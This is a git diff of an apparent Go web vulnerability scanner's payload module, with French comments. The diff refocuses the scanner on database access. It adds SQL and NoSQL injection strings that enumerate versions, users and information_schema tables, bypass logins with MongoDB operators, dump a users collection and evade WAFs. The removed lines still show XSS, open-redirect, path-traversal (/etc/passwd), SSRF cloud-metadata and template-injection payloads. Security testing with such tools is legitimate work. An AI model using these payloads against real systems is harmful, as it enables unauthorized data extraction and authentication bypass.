@@ -73,159 +73,116 @@ var SQLErrorPatterns = map[string][]string{
 	},
 }
 
-// Payloads rapides — les plus efficaces en bug bounty
+// NoSQLErrorPatterns pour MongoDB et autres.
+var NoSQLErrorPatterns = []string{
+	`MongoError`,
+	`MongoDB`,
+	`BSON`,
+	`unknown operator`,
+	`failed to parse`,
+	`\$where`,
+	`BadValue`,
+	`SyntaxError.*json`,
+	`Couchbase`,
+	`Redis.*ERR`,
+}
+
+// Payloads orientés accès DB — extraction version/schémas
 var (
 	fastErrorPayloads = []string{
 		"'",
 		`' OR '1'='1'--`,
 		`1' OR '1'='1--`,
 		`') OR ('1'='1`,
-		`1 OR 1=1`,
+		`1 OR 1=1--`,
 		`admin'--`,
-		`' UNION SELECT NULL--`,
-		`" OR "1"="1`,
+		`1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--`,
+		`1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--`,
 	}
 
 	fastUnionPayloads = []string{
 		`' UNION SELECT NULL--`,
-		`' UNION SELECT NULL,NULL--`,
+		`' UNION SELECT version(),NULL--`,
+		`' UNION SELECT database(),NULL--`,
+		`' UNION SELECT user(),NULL--`,
 		`' UNION SELECT 1,@@version,3--`,
-		`') UNION SELECT NULL--`,
+		`' UNION SELECT table_name,NULL FROM information_schema.tables--`,
 	}
 
-	fastBooleanTrue = []string{`' OR '1'='1`, `' OR 1=1--`}
+	fastBooleanTrue  = []string{`' OR '1'='1`, `' OR 1=1--`}
 	fastBooleanFalse = []string{`' AND '1'='2`, `' AND 1=2--`}
 
 	fastTimeTemplates = []string{
 		`' AND SLEEP(%d)--`,
 		`'; SELECT pg_sleep(%d)--`,
+		`'; WAITFOR DELAY '0:0:%d'--`,
 	}
 
-	fastXSSPayloads = []string{
-		`<script>alert(1)</script>`,
-		`"><script>alert(1)</script>`,
-		`'><svg/onload=alert(1)>`,
-		`<img src=x onerror=alert(1)>`,
-		`'"><img src=x onerror=alert(1)>`,
-		`javascript:alert(1)`,
+	fastNoSQLPayloads = []string{
+		`{"$gt":""}`,
+		`{"$ne":null}`,
+		`' || '1'=='1`,
+		`"; return true; var a="`,
+		`[$ne]=1`,
+		`{"$regex":".*"}`,
 	}
 
-	fastRedirectPayloads = []string{
-		`https://evil.com`,
-		`//evil.com`,
-		`/\evil.com`,
-		`////evil.com`,
-		`https:evil.com`,
-	}
-
-	fastLFIPayloads = []string{
-		`../../../etc/passwd`,
-		`....//....//etc/passwd`,
-		`..%2f..%2f..%2fetc/passwd`,
-		`/etc/passwd`,
-		`..\\..\\..\\windows\\win.ini`,
-		`....\/....\/etc/passwd`,
-	}
-
-	fastSSRFPayloads = []string{
-		`http://127.0.0.1`,
-		`http://localhost`,
-		`http://169.254.169.254/latest/meta-data/`,
-		`http://[::1]`,
-	}
-
-	fastSSTIPayloads = []string{
-		`{{7*7}}`,
-		`${7*7}`,
-		`#{7*7}`,
-		`{{7*'7'}}`,
-		`*{7*7}`,
-	}
-
-	idorProbeParams = []string{"id", "user_id", "userid", "uid", "account_id", "order_id", "doc_id", "file_id"}
-)
-
-// Payloads complets
-var (
 	fullErrorPayloads = []string{
 		"'", `"`,
-		`' OR '1'='1`, `' OR '1'='1'--`, `' OR '1'='1'#`, `' OR '1'='1'/*`,
-		`') OR ('1'='1`, `1' OR '1'='1`, `1 OR 1=1`, `1' OR '1'='1'-- -`,
+		`' OR '1'='1`, `' OR '1'='1'--`, `' OR '1'='1'#`,
+		`') OR ('1'='1`, `1' OR '1'='1`, `1 OR 1=1--`,
 		`admin'--`, `admin' #`,
-		`' UNION SELECT NULL--`, `' UNION SELECT NULL,NULL--`,
 		`1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--`,
 		`1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--`,
+		`1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--`,
 		`' AND 1=CONVERT(int,(SELECT @@version))--`,
+		`' AND 1=CAST((SELECT @@version) AS int)--`,
 		`'||(SELECT version())||'`,
+		`'; SELECT version()--`,
 	}
 
 	fullUnionPayloads = []string{
 		`' UNION SELECT NULL--`, `' UNION SELECT NULL,NULL--`,
-		`' UNION SELECT NULL,NULL,NULL--`, `' UNION SELECT NULL,NULL,NULL,NULL--`,
-		`' UNION ALL SELECT NULL--`, `' UNION ALL SELECT NULL,NULL--`,
-		`') UNION SELECT NULL--`, `' UNION SELECT 1,2,3--`,
+		`' UNION SELECT version(),NULL--`, `' UNION SELECT database(),NULL--`,
+		`' UNION SELECT user(),NULL--`, `' UNION SELECT @@version,NULL--`,
 		`' UNION SELECT 1,@@version,3--`, `' UNION SELECT 1,version(),3--`,
-		`0 UNION SELECT NULL,NULL,NULL--`, `-1 UNION SELECT NULL,NULL,NULL--`,
+		`' UNION SELECT table_name,NULL FROM information_schema.tables--`,
+		`' UNION SELECT schema_name,NULL FROM information_schema.schemata--`,
+		`' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables--`,
+		`') UNION SELECT NULL--`, `0 UNION SELECT NULL,NULL--`,
 	}
 
 	fullBooleanTrue = []string{
 		`' OR '1'='1`, `' OR 1=1--`, `' OR 1=1#`, `1 OR 1=1`,
-		`1' OR '1'='1'--`, `') OR ('1'='1'--`, `1) OR (1=1`, `' OR ''='`,
+		`1' OR '1'='1'--`, `') OR ('1'='1'--`,
 	}
 	fullBooleanFalse = []string{
 		`' AND '1'='2`, `' AND 1=2--`, `' AND 1=2#`, `1 AND 1=2`,
-		`1' AND '1'='2'--`, `') AND ('1'='2'--`, `1) AND (1=2`, `' AND ''='`,
+		`1' AND '1'='2'--`, `') AND ('1'='2'--`,
 	}
 
 	fullTimeTemplates = []string{
 		`' AND SLEEP(%d)--`, `' AND SLEEP(%d)#`,
-		`1' AND SLEEP(%d)--`, `1) AND SLEEP(%d)--`,
-		`'; WAITFOR DELAY '0:0:%d'--`, `'; SELECT pg_sleep(%d)--`,
-		`1'; SELECT pg_sleep(%d)--`,
+		`1' AND SLEEP(%d)--`, `'; WAITFOR DELAY '0:0:%d'--`,
+		`'; SELECT pg_sleep(%d)--`, `1'; SELECT pg_sleep(%d)--`,
 		`' AND (SELECT * FROM (SELECT(SLEEP(%d)))a)--`,
 		`' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',%d)--`,
 	}
 
-	fullXSSPayloads = []string{
-		`<script>alert(1)</script>`, `"><script>alert(1)</script>`,
-		`'><svg/onload=alert(1)>`, `<img src=x onerror=alert(1)>`,
-		`'"><img src=x onerror=alert(1)>`, `javascript:alert(1)`,
-		`<body onload=alert(1)>`, `<iframe src=javascript:alert(1)>`,
-		`"><img src=x onerror=alert(1)>`, `<svg><script>alert(1)</script>`,
-		`{{constructor.constructor('alert(1)')()}}`,
-	}
-
-	fullRedirectPayloads = []string{
-		`https://evil.com`, `//evil.com`, `/\evil.com`, `////evil.com`,
-		`https:evil.com`, `//google.com`, `/%09/evil.com`,
-		`https://evil.com%00.target.com`, `///evil.com`,
-	}
-
-	fullLFIPayloads = []string{
-		`../../../etc/passwd`, `....//....//etc/passwd`,
-		`..%2f..%2f..%2fetc/passwd`, `/etc/passwd`,
-		`..\\..\\..\\windows\\win.ini`, `....\/....\/etc/passwd`,
-		`file:///etc/passwd`, `php://filter/convert.base64-encode/resource=index.php`,
-		`/proc/self/environ`, `....//....//....//etc/passwd`,
-	}
-
-	fullSSRFPayloads = []string{
-		`http://127.0.0.1`, `http://localhost`, `http://127.0.0.1:80`,
-		`http://169.254.169.254/latest/meta-data/`, `http://[::1]`,
-		`http://0.0.0.0`, `http://metadata.google.internal/`,
-		`http://127.1`, `dict://127.0.0.1:6379/info`,
-	}
-
-	fullSSTIPayloads = []string{
-		`{{7*7}}`, `${7*7}`, `#{7*7}`, `{{7*'7'}}`, `*{7*7}`,
-		`<%= 7*7 %>`, `{{config}}`, `{{self}}`, `{{''.__class__}}`,
-		`{7*7}`, `[[7*7]]`,
+	fullNoSQLPayloads = []string{
+		`{"$gt":""}`, `{"$ne":null}`, `{"$regex":".*"}`,
+		`' || '1'=='1`, `"; return true; var a="`,
+		`[$ne]=1`, `{"$where":"1==1"}`,
+		`{"username":{"$gt":""},"password":{"$gt":""}}`,
+		`0]; return db.users.find(); var foo=[0`,
+		`' && this.password.match(/.*/)//`,
+		`{"$or":[{"a":"a"},{"a":"a"}]}`,
 	}
 
 	wafBypassPayloads = []string{
 		`' oR '1'='1`, `'%20OR%20'1'='1`, `'/**/OR/**/'1'='1`,
-		`'%09OR%091=1--`, `' UnIoN SeLeCt NULL--`,
-		`' /*!50000OR*/ '1'='1`, `1'||'1'='1`, `' OR 2>1--`,
+		`' UnIoN SeLeCt version(),NULL--`, `' /*!50000OR*/ '1'='1`,
+		`1'||'1'='1`, `' OR 2>1--`,
 	}
 )
 
@@ -235,7 +192,7 @@ type BooleanPair struct {
 	False string
 }
 
-// BuildJobs génère la liste de tests ordonnés par priorité.
+// BuildJobs génère les tests DB ordonnés par priorité.
 func BuildJobs(opts models.ScanOptions) []models.TestJob {
 	categories := opts.Categories
 	if len(categories) == 0 {
@@ -249,33 +206,17 @@ func BuildJobs(opts models.ScanOptions) []models.TestJob {
 		switch cat {
 		case models.CategorySQLi:
 			jobs = append(jobs, buildSQLiJobs(opts, full)...)
-		case models.CategoryXSS:
-			jobs = append(jobs, buildSimpleJobs(models.XSS, cat, xssPayloads(full), 20)...)
-		case models.CategorySSTI:
-			jobs = append(jobs, buildSimpleJobs(models.SSTI, cat, sstiPayloads(full), 25)...)
-		case models.CategoryRedirect:
-			jobs = append(jobs, buildSimpleJobs(models.OpenRedirect, cat, redirectPayloads(full), 30)...)
-		case models.CategoryLFI:
-			jobs = append(jobs, buildSimpleJobs(models.LFI, cat, lfiPayloads(full), 40)...)
-		case models.CategorySSRF:
-			jobs = append(jobs, buildSimpleJobs(models.SSRF, cat, ssrfPayloads(full), 50)...)
-		case models.CategoryIDOR:
-			// IDOR : pas de payload, testé séparément dans le scanner
+		case models.CategoryNoSQL:
+			jobs = append(jobs, buildSimpleJobs(models.NoSQL, cat, nosqlPayloads(full), 30)...)
 		}
 	}
 
 	if opts.IncludeWAF {
-		for i, j := range jobs {
-			if j.VulnType == models.SQLiError {
-				for _, w := range wafBypassPayloads {
-					jobs = append(jobs, models.TestJob{
-						Param: "", VulnType: models.SQLiError, Category: models.CategorySQLi,
-						Payload: w, Priority: j.Priority,
-					})
-				}
-				_ = i
-				break
-			}
+		for _, w := range wafBypassPayloads {
+			jobs = append(jobs, models.TestJob{
+				VulnType: models.SQLiError, Category: models.CategorySQLi,
+				Payload: w, Priority: 2,
+			})
 		}
 	}
 	for _, c := range opts.CustomPayloads {
@@ -327,9 +268,9 @@ func buildSQLiJobs(opts models.ScanOptions, full bool) []models.TestJob {
 	return jobs
 }
 
-func buildSimpleJobs(vt models.VulnType, cat models.VulnCategory, payloads []string, basePriority int) []models.TestJob {
-	jobs := make([]models.TestJob, 0, len(payloads))
-	for i, p := range payloads {
+func buildSimpleJobs(vt models.VulnType, cat models.VulnCategory, plist []string, basePriority int) []models.TestJob {
+	jobs := make([]models.TestJob, 0, len(plist))
+	for i, p := range plist {
 		jobs = append(jobs, models.TestJob{
 			VulnType: vt, Category: cat, Payload: p, Priority: basePriority + i,
 		})
@@ -349,6 +290,13 @@ func unionPayloads(full bool) []string {
 		return append([]string{}, fullUnionPayloads...)
 	}
 	return append([]string{}, fastUnionPayloads...)
+}
+
+func nosqlPayloads(full bool) []string {
+	if full {
+		return append([]string{}, fullNoSQLPayloads...)
+	}
+	return append([]string{}, fastNoSQLPayloads...)
 }
 
 func booleanPairs(full bool) []BooleanPair {
@@ -374,46 +322,6 @@ func timeTemplates(full bool) []string {
 	return append([]string{}, fastTimeTemplates...)
 }
 
-func xssPayloads(full bool) []string {
-	if full {
-		return append([]string{}, fullXSSPayloads...)
-	}
-	return append([]string{}, fastXSSPayloads...)
-}
-
-func redirectPayloads(full bool) []string {
-	if full {
-		return append([]string{}, fullRedirectPayloads...)
-	}
-	return append([]string{}, fastRedirectPayloads...)
-}
-
-func lfiPayloads(full bool) []string {
-	if full {
-		return append([]string{}, fullLFIPayloads...)
-	}
-	return append([]string{}, fastLFIPayloads...)
-}
-
-func ssrfPayloads(full bool) []string {
-	if full {
-		return append([]string{}, fullSSRFPayloads...)
-	}
-	return append([]string{}, fastSSRFPayloads...)
-}
-
-func sstiPayloads(full bool) []string {
-	if full {
-		return append([]string{}, fullSSTIPayloads...)
-	}
-	return append([]string{}, fastSSTIPayloads...)
-}
-
-// IDORProbeParams retourne les noms de paramètres à tester pour IDOR.
-func IDORProbeParams() []string {
-	return append([]string{}, idorProbeParams...)
-}
-
 func formatTime(templates []string, delay int) []string {
 	if delay < 1 {
 		delay = 3
@@ -425,17 +333,9 @@ func formatTime(templates []string, delay int) []string {
 	return out
 }
 
-// DefaultCategories retourne les catégories par défaut selon le mode.
+// DefaultCategories : uniquement injections donnant accès DB.
 func DefaultCategories(mode models.ScanMode) []models.VulnCategory {
-	return []models.VulnCategory{
-		models.CategorySQLi,
-		models.CategoryXSS,
-		models.CategorySSTI,
-		models.CategoryRedirect,
-		models.CategoryLFI,
-		models.CategorySSRF,
-		models.CategoryIDOR,
-	}
+	return []models.VulnCategory{models.CategorySQLi, models.CategoryNoSQL}
 }
 
 // DefaultSQLiTechniques retourne les techniques SQLi par défaut.
@@ -443,7 +343,6 @@ func DefaultSQLiTechniques(mode models.ScanMode) []models.VulnType {
 	if mode == models.ScanFull {
 		return []models.VulnType{models.SQLiError, models.SQLiUnion, models.SQLiBoolean, models.SQLiTime}
 	}
-	// Mode rapide : pas de time-based (trop lent)
 	return []models.VulnType{models.SQLiError, models.SQLiUnion, models.SQLiBoolean}
 }
 
@@ -452,23 +351,13 @@ func AllTechniques() []models.VulnType {
 	return []models.VulnType{models.SQLiError, models.SQLiBoolean, models.SQLiTime, models.SQLiUnion}
 }
 
-// ParseCategory parse une catégorie ou technique depuis la CLI.
+// ParseCategory parse une catégorie depuis la CLI.
 func ParseCategory(s string) (models.VulnCategory, models.VulnType, error) {
 	switch strings.ToLower(s) {
 	case "sqli", "sql":
 		return models.CategorySQLi, "", nil
-	case "xss":
-		return models.CategoryXSS, models.XSS, nil
-	case "ssti", "template":
-		return models.CategorySSTI, models.SSTI, nil
-	case "idor", "bac", "access":
-		return models.CategoryIDOR, models.IDOR, nil
-	case "redirect", "open_redirect", "openredirect":
-		return models.CategoryRedirect, models.OpenRedirect, nil
-	case "lfi", "path_traversal", "traversal":
-		return models.CategoryLFI, models.LFI, nil
-	case "ssrf":
-		return models.CategorySSRF, models.SSRF, nil
+	case "nosql", "mongo", "mongodb":
+		return models.CategoryNoSQL, models.NoSQL, nil
 	case "error", "error_based", "e":
 		return models.CategorySQLi, models.SQLiError, nil
 	case "boolean", "boolean_blind", "b":
@@ -478,11 +367,11 @@ func ParseCategory(s string) (models.VulnCategory, models.VulnType, error) {
 	case "union", "union_based", "u":
 		return models.CategorySQLi, models.SQLiUnion, nil
 	default:
-		return "", "", fmt.Errorf("catégorie inconnue : %s", s)
+		return "", "", fmt.Errorf("catégorie inconnue : %s (sqli, nosql, error, boolean, time, union)", s)
 	}
 }
 
-// GetBooleanPairs retourne les paires boolean (rétrocompat tests).
+// GetBooleanPairs retourne les paires boolean.
 func GetBooleanPairs(full bool) []BooleanPair {
 	return booleanPairs(full)
 }
